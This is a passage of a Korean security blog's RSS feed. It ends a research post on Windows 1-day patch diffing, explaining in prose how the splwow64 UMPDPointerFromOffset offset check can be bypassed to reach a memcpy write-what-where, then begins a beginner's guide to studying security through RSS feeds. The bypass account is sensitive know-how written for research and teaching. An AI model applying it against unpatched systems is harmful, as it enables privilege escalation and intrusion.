&#xC0C1;&#xD0DC;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;..&#x315C;&#x315C;</p><p>&#xADF8;&#xB798;&#xC11C; CVE-2021-1649&#xC758; backporting&#xC774; &#xB41C; &#xAC8C; &#xC544;&#xB2D0;&#xAE4C; &#xCD94;&#xCE21;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sql">backporting&#xC774;&#xB780;&#xA0;&#xD328;&#xCE58; &#xC2DC;&#xC810;&#xC5D0;&#xA0;&#xC774;&#xC804; &#xBC84;&#xC804;&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBC30;&#xD3EC;&#xC5D0;&#xB3C4; &#xAC19;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</code></pre><p>&#xC544;&#xB9C8;&#xB3C4; CVE-2021-1648 bypass &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;&#xB97C; &#xD558;&#xBA74;&#xC11C; CVE-2020-0986 &#xD328;&#xCE58;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC218;&#xC815;&#xD574; &#xBC30;&#xD3EC;&#xD55C; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xAD00;&#xB828; &#xC790;&#xB8CC;&#xB3C4; &#xCC3E;&#xC544;&#xBCFC; &#xC218; &#xC5C6;&#xC5B4;&#xC11C; &#xC774;&#xB7F0; &#xAC00;&#xB2A5;&#xC131;&#xB3C4; &#xC788;&#xC744; &#xC218; &#xC788;&#xACA0;&#xAD6C;&#xB098; &#xB77C;&#xB294; &#xCD94;&#xCE21;&#xC774;&#xC9C0;&#xB9CC;..</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2024.png" alt="Untitled"></p><p>&#xADF8;&#xB798;&#xC11C; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810; &#xBCF4;&#xACE0;&#xC11C;&#xB97C; &#xCC3E;&#xC544;&#xAC00;&#xBA70; backporting &#xC804; <code>UMPDPointerFromOffset</code> &#xD568;&#xC218;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD3EC;&#xC778;&#xD130; &#xC624;&#xD504;&#xC14B;&#xC774; <code>0x7fffffff</code>&#xC744; &#xB118;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xAC80;&#xC0AC;&#xD574; 64bit &#xD658;&#xACBD;&#xC758; &#xD799; &#xBC0F; &#xAE30;&#xD0C0; &#xC911;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xC744; &#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; Splwow64 &#xC11C;&#xBE44;&#xC2A4;&#xB294; 32bit &#xB808;&#xAC70;&#xC2DC; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; splwow64&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; 32bit &#xD799;&#xC740; <code>0x7fffffff</code>&#xBCF4;&#xB2E4; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xBA70; &#xC8FC;&#xC18C;&#xB97C; leak &#xD558;&#xACE0; leak&#xD55C; &#xD799; &#xC704;&#xCE58;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC804;&#xB2EC;&#xD574;&#xB3C4; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xB808;&#xAC70;&#xC2DC; &#xC11C;&#xBE44;&#xC2A4;&#xC778; &#xAC83;&#xC744; &#xACE0;&#xB824;&#xD558;&#xC9C0; &#xC54A;&#xACE0; 64bit &#xC8FC;&#xC18C; &#xCCB4;&#xACC4;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB97C; &#xD574; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xC73C;&#xB098;&#xB9C8;&#xB098; &#xD55C; &#xAC8C; &#xB41C; &#xAC83;&#xC774;&#xC8E0;. &#xC774;&#xB807;&#xAC8C; &#xCD94;&#xAC00;&#xB41C; &#xAC80;&#xC0AC; &#xD568;&#xC218;&#xB97C; &#xBAA8;&#xB450; bypass &#xD558;&#xBA74; &#xAE30;&#xC874; <code>memcpy</code>&#xC758; write-what-where &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC545;&#xC6A9; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2025.png" alt="Untitled"></p><p>&#xC694;&#xC57D;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>1-day&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C; Windows&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC640; Delta Patch&#xB85C; &#xBD84;&#xC11D;&#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810; &#xC644;&#xD654; &#xD328;&#xCE58;&#xB97C; Diffing &#xBD84;&#xC11D;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xBCC0;&#xACBD;&#xC810;&#xC744; tracking &#xD558;&#xACE0; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.<ul><li>&#xC774;&#xB294; &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC744; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;</li></ul></li><li>backporting &#xC5EC;&#xBD80;&#xB97C; &#xAF2D; &#xD655;&#xC778;&#xD558;&#xC790;&#x2026;.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://whereisk0shl.top/post/the_story_of_cve_2021_1648">https://whereisk0shl.top/post/the_story_of_cve_2021_1648</a></p><p><a href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/">https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/security-one/">security one</category>
      
      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
      
      <category domain="https://hackyboiz.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://hackyboiz.github.io/tags/binary-diffing/">binary diffing</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/08/l0ch/windows_1-day_patch_diffing/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] RSS Crawler를 이용한 보안 입문법</title>
      <link>https://hackyboiz.github.io/2021/09/08/fabu1ous/crazy-wall/</link>
      <guid>https://hackyboiz.github.io/2021/09/08/fabu1ous/crazy-wall/</guid>
      <pubDate>Wed, 08 Sep 2021 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/09/08/fabu1ous/crazy-wall/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; Fabu1ous&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. 2</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/09/08/fabu1ous/crazy-wall/1.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; Fabu1ous&#xC785;&#xB2C8;&#xB2E4;. 2021 9&#xC6D4; 3&#xC77C;, &#xBD80;&#xC0B0;&#xC5D0;&#xC11C; &#xC5F4;&#xB9B0; &#xC2DC;&#xC6D0;(Security-One) &#xD3EC;&#xB7FC;&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xD558;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C; Hackyboiz &#xD300;&#xC5D0;&#xC120; &#xC5B4;&#xB5BB;&#xAC8C; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0;, &#xC774; &#xACF5;&#xBD80;&#xBC95;&#xC774; &#xBCF4;&#xC548; &#xC785;&#xBB38;&#xC790; &#xBD84;&#xB4E4;&#xAED8; &#xC5B4;&#xB5A4; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xC18C;&#xAC1C;&#xD558;&#xB294; &#xBC1C;&#xD45C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC6D0; &#xD3EC;&#xB7FC;&#xCC98;&#xB7FC; &#xC2DC; &#xB2E8;&#xC704; &#xC2A4;&#xCF00;&#xC77C;&#xC758; &#xC790;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xCC98;&#xC74C;&#xC774;&#xB77C;, &#xAC8C;&#xB2E4;&#xAC00; &#xC778;&#xD130;&#xB137; &#xC0DD;&#xC911;&#xACC4;&#xAC00; &#xB418;&#xB294; &#xBC1C;&#xD45C;&#xB294; &#xCC98;&#xC74C;&#xC774;&#xB77C; &#xB9CE;&#xC774; &#xAE34;&#xC7A5;&#xD574;&#xC11C; &#xB0B4;&#xC6A9; &#xC804;&#xB2EC;&#xC774; &#xC6D0;&#xD65C;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xB358; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xBE14;&#xB85C;&#xADF8;&#xC5D0; &#xC880; &#xB354; &#xC815;&#xB3C8;&#xB41C; &#xB9D0;&#xB85C; &#xD574;&#xB2F9; &#xBC1C;&#xD45C;&#xB97C; &#xB0A8;&#xAE41;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/3.png" alt>&#xD574;&#xB2F9; &#xBC1C;&#xD45C;&#xB294; &#xBCF4;&#xC548; &#xC785;&#xBB38;&#xC790;&#xBD84;&#xB4E4;&#xC744; &#xC704;&#xD574; &#xC900;&#xBE44;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBCF4;&#xC548; &#xC785;&#xBB38;&#xC790;&#xBD84;&#xB4E4;&#xC774; &#xC6CC;&#xAC8C;&#xC784;&#xC73C;&#xB85C; &#xBCF4;&#xC548;&#xC5D0; &#xBC1C;&#xC744; &#xB4E4;&#xC774;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xC6CC;&#xAC8C;&#xC784; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xB2E4; &#xBCF4;&#xBA74; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xC9C0;&#xC2DD;&#xB3C4; &#xC313;&#xC774;&#xACE0; &#xC131;&#xCDE8;&#xAC10;&#xB3C4; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xB9C9;&#xC0C1; &#xC6CC;&#xAC8C;&#xC784;&#xB9CC; &#xD480;&#xC5B4;&#xC624;&#xB2E4;&#xAC00; &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC;&#xC5D0;&#xC11C; &#xACBD;&#xD5D8;&#xC744; &#xC313;&#xACE0; &#xC2E4;&#xC801;&#xC744; &#xB0B4;&#xB824;&#xACE0; &#xD558;&#xBA74; &#xC5B4;&#xB514;&#xC11C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574;&#xC57C; &#xD560;&#xC9C0; &#xAC08;&#xD53C;&#xB97C; &#xBABB; &#xC7A1;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xB9CE;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC800;&#xD76C; Hackyboiz&#xC5D0;&#xC120; &#xC5B4;&#xB5A4; &#xACF5;&#xBD80;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0;, &#xC774; &#xACF5;&#xBD80;&#xBC95;&#xC774; &#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xC0C1;&#xD669;&#xC5D0; &#xCC98;&#xD574;&#xC788;&#xB294; &#xB274;&#xBE44;&#xB4E4;&#xC5D0;&#xAC8C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xC54C;&#xB824;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/4.png" alt></p><p>&#xBAA9;&#xCC28;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; &#xC65C; &#xC774;&#xB7F0; &#xACF5;&#xBD80;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0;, &#xC5B4;&#xB5A4; &#xAE00;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xC9D1;&#xD574;&#xC57C; &#xD558;&#xB294;&#xC9C0;, &#xAE00;&#xC758; &#xC885;&#xB958;&#xC5D0; &#xB530;&#xB77C; &#xC5B4;&#xB5A4; &#xB0B4;&#xC6A9;&#xC5D0; &#xC8FC;&#xBAA9;&#xD574;&#xC57C;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xAC04;&#xB2E8;&#xD788; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC81C;&#xAC00; 1&#xB144; &#xBC18;&#xB3D9;&#xC548; &#xC774; &#xACF5;&#xBD80;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; &#xACBD;&#xD5D8;&#xB2F4;&#xC744; &#xB4E4;&#xB824;&#xB4DC;&#xB9AC;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xD6A8;&#xACFC;&#xB97C; &#xAE30;&#xB300;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC54C;&#xB824;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/5.png" alt></p><p>&#xB274;&#xBE44;&#xBD84;&#xB4E4;&#xC774; &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC; &#xC785;&#xBB38;&#xD558;&#xB294;&#xB370; &#xC5B4;&#xB824;&#xC6B4; &#xC774;&#xC720;&#xB294; &#xBC14;&#xB85C; &#xC2DC;&#xC57C;&#xAC00; &#xC881;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. Root cause, Chainning, Impact&#xAE4C;&#xC9C0; &#xACE0;&#xB824;&#xD574;&#xBCF4;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC885;&#xB958;&#xB294; &#xC815;&#xB9D0; &#xBC29;&#xB300;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC5D0; &#xBC18;&#xD574; &#xC785;&#xBB38;&#xC790; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xC6CC;&#xAC8C;&#xC784;&#xC744; &#xD1B5;&#xD574; &#xBC30;&#xC6B8; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC885;&#xB958;&#xB294; &#xB9E4;&#xC6B0; &#xD55C;&#xC815;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xAD00;&#xC2EC;&#xC774; &#xC870;&#xAE08;&#xC774;&#xB77C;&#xACE0; &#xC788;&#xB294; &#xC0AC;&#xB78C;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xB984; &#xD55C; &#xBC88;&#xCBE4;&#xC740; &#xB4E4;&#xC5B4;&#xBD24;&#xC744; &#xBC95;&#xD55C; &#xD074;&#xB798;&#xC2DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xB300;&#xBD80;&#xBD84;&#xC774;&#xC8E0;. &#xADFC;&#xB370; &#xC774;&#xB7F0; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; &#xAD49;&#xC7A5;&#xD788; &#xC720;&#xBA85;&#xD558;&#xACE0; &#xC624;&#xB798;&#xB418;&#xAE30;&#xB3C4; &#xD574;&#xC11C; &#xC6CC;&#xAC8C;&#xC784; &#xBB38;&#xC81C;&#xCC98;&#xB7FC; &#xC811;&#xADFC;&#xD588;&#xB2E4;&#xAC00;&#xB294; &#xD06C;&#xAC8C; &#xACE0;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/6.png" alt></p><p>&#xC2DC;&#xC57C;&#xB97C; &#xC870;&#xAE08;&#xB9CC; &#xB113;&#xD600;&#xBCF4;&#xBA74; &#xC138;&#xC0C1;&#xC5D4; &#xC815;&#xB9D0; &#xB2E4;&#xC591;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xB9CE;&#xC740; &#xC5F0;&#xAD6C;&#xB4E4;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xAC01;&#xC5D0;&#xC11C; &#xBC14;&#xB77C;&#xBCFC; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC81C;&#xC2DC;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/7.png" alt></p><p>&#xADF8;&#xB798;&#xC11C; &#xC2DC;&#xC57C;&#xB97C; &#xB113;&#xD790; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBB50;&#xB0D0;? &#xBC14;&#xB85C; RSS Crawler&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xCD5C;&#xC2E0; &#xC774;&#xC288; &#xB530;&#xB77C;&#xC7A1;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C; Hackyboiz &#xD300;&#xC740; &#xCD5C;&#xC2E0; &#xBCF4;&#xC548; &#xC774;&#xC288;&#xB97C; &#xB530;&#xB77C;&#xB2E4;&#xB2C8;&#xBA70; &#xBCF4;&#xC548;&#xC5D0; &#xB300;&#xD55C; &#xC2DC;&#xC57C;&#xB97C; &#xB113;&#xD788;&#xACE0;&#xC790; &#xB178;&#xB825;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/8.png" alt></p><p>RSS(Really Simple Syndication)&#xC740; &#xC720;&#xC800; &#xD639;&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xBCC0;&#xACBD;&#xC0AC;&#xD56D;&#xC744; &#xC27D;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC81C;&#xACF5;&#xB418;&#xB294; &#xC6F9; &#xD53C;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xBE14;&#xB85C;&#xADF8; &#xD50C;&#xB7AB;&#xD3FC;, &#xC778;&#xD130;&#xB137; &#xAE30;&#xC0AC; &#xC11C;&#xBE44;&#xC2A4; &#xB4F1; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; RSS&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. RSS &#xC8FC;&#xC18C;&#xB97C; RSS &#xB9AC;&#xB354;&#xC5D0; &#xB4F1;&#xB85D;&#xD574; &#xAD6C;&#xB3C5;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xCEE8;&#xD0E0;&#xCE20;&#xAC00; &#xCD94;&#xAC00;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; &#xC218;&#xC9D1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/9.png" alt></p><p>&#xC800;&#xB294; feedly&#xB77C;&#xB294; RSS &#xAD6C;&#xB3C5; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC720;&#xB8CC; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC2EB;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xC9C1;&#xC811; RSS Crawler&#xB97C; &#xC81C;&#xC791;&#xD558;&#xC154;&#xC11C; RSS &#xD53C;&#xB4DC;&#xB4E4;&#xC744; &#xC218;&#xC9D1;&#xD558;&#xC154;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C; Hackyboiz&#xC758; &#xAC1C;&#xBC1C; HackRSS&#xB77C;&#xB294; &#xD574;&#xD0B9; &#xAD00;&#xB828; RSS &#xD53C;&#xB4DC;&#xB97C; &#xC218;&#xC9D1;/&#xC81C;&#xACF5;&#xD574;&#xC8FC;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; RSS &#xAD6C;&#xB3C5; &#xC11C;&#xBE44;&#xC2A4; &#xD639;&#xC740; RSS Crawler&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC778;&#xD130;&#xB137; &#xAE30;&#xC0AC;, &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; write-up, &#xC5F0;&#xAD6C;&#xAE00;, twitter, &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xC2F8;&#xC774;&#xD2B8; &#xB4F1;&#xC5D0;&#xC11C; RSS &#xD53C;&#xB4DC;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. Twitter &#xAC19;&#xC740; SNS &#xB4E4;&#xC758; &#xACBD;&#xC6B0; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xACF5;&#xC720;&#xD558;&#xBA74;&#xC11C; &#xD574;&#xB2F9; &#xAE00;&#xC5D0; &#xB300;&#xD55C; &#xD3C9;&#xAC00;&#xC640; &#xAC19;&#xC740; &#xC0AC;&#xC124;&#xC744; &#xB2F4;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC544; &#xB2E4;&#xC591;&#xD55C; &#xC0AC;&#xB78C;&#xB4E4;&#xC758; &#xC758;&#xACAC;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/10.png" alt></p><p>&#xC77C;&#xC815; &#xC8FC;&#xAE30;&#xB85C; &#xC218;&#xC9D1;&#xD55C; &#xAE00;&#xB4E4; &#xC911; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xAC83;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xC2A4;&#xD06C;&#xB7A9;&#xD574; &#xB193;&#xC73C;&#xC168;&#xB2E4;&#xAC00; &#xC2DC;&#xAC04; &#xB0A0; &#xB54C; &#xC815;&#xB3C5;&#xD558;&#xACE0; &#xC815;&#xB9AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xACF5;&#xBD80;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C; &#xD300;&#xC740; &#xB9E4;&#xC77C; &#xC544;&#xCE68; &#xCD9C;&#xADFC;/&#xB4F1;&#xAD50;&#xD558;&#xBA70; &#xC804;&#xB0A0; &#xC218;&#xC9D1;&#xB41C; RSS &#xD53C;&#xB4DC;&#xB4E4;&#xC744; &#xD6D1;&#xC5B4; &#xBCF4;&#xACE0; &#xADF8;&#xC911; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xAE00;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xC800;&#xB141;&#xC5D0; &#xC815;&#xB3C5;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/11.png" alt></p><p>&#xC218;&#xC9D1;&#xB418;&#xB294; &#xAE00;&#xB4E4;&#xC744; &#xB09C;&#xC774;&#xB3C4; &#xBCC4;&#xB85C; &#xAD6C;&#xBD84;&#xD558;&#xACE0; &#xAC01; &#xB09C;&#xC774;&#xB3C4; &#xBCC4;&#xB85C; &#xAE00;&#xC744; &#xC77D;&#xB294; &#xBAA9;&#xC801;&#xACFC; &#xC8FC;&#xBAA9;&#xD574;&#xC57C; &#xD560; &#xB0B4;&#xC6A9; &#xB4F1;&#xC744; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#x201C;&#xB09C;&#xC774;&#xB3C4; &#xD558;&#x201D;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xC220;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC744; &#xAE4A;&#xAC8C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xB294; High-level&#xC758; &#xC815;&#xBCF4;&#xAE00;&#xB4E4;&#xC744; &#x201C;&#xB09C;&#xC774;&#xB3C4; &#xD558;&#x201D;&#xB85C; &#xC7A1;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xD130;&#xB137; &#xAE30;&#xC0AC;&#xB97C; &#xC608;&#xB85C; &#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xAE00;&#xB4E4;&#xC744; &#xC77D;&#xC744; &#xB54C;&#xB294; &#xAE00;&#xC758; &#xD575;&#xC2EC; &#xB0B4;&#xC6A9;&#xC744; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xC0C8;&#xB86D;&#xAC8C; &#xC54C;&#xAC8C; &#xB41C; &#xC0AC;&#xC2E4; &#xB4F1;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC26C;&#xC6B4; &#xAE00;&#xC744; &#xC704;&#xC8FC;&#xB85C; &#xB9CE;&#xC774; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xAE30;&#xCD08;&#xC9C0;&#xC2DD;&#xC744; &#xC313;&#xB294;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB85C; 2&#xAC1C;&#xC758; &#xAE00;&#xC744; &#xB4E4;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC36C;&#xB354;&#xC2A4;&#xD30C;&#xC774;<ul><li>&#xC36C;&#xB354;&#xBCFC;&#xD2B8; &#xD3EC;&#xD2B8;&#xB97C; 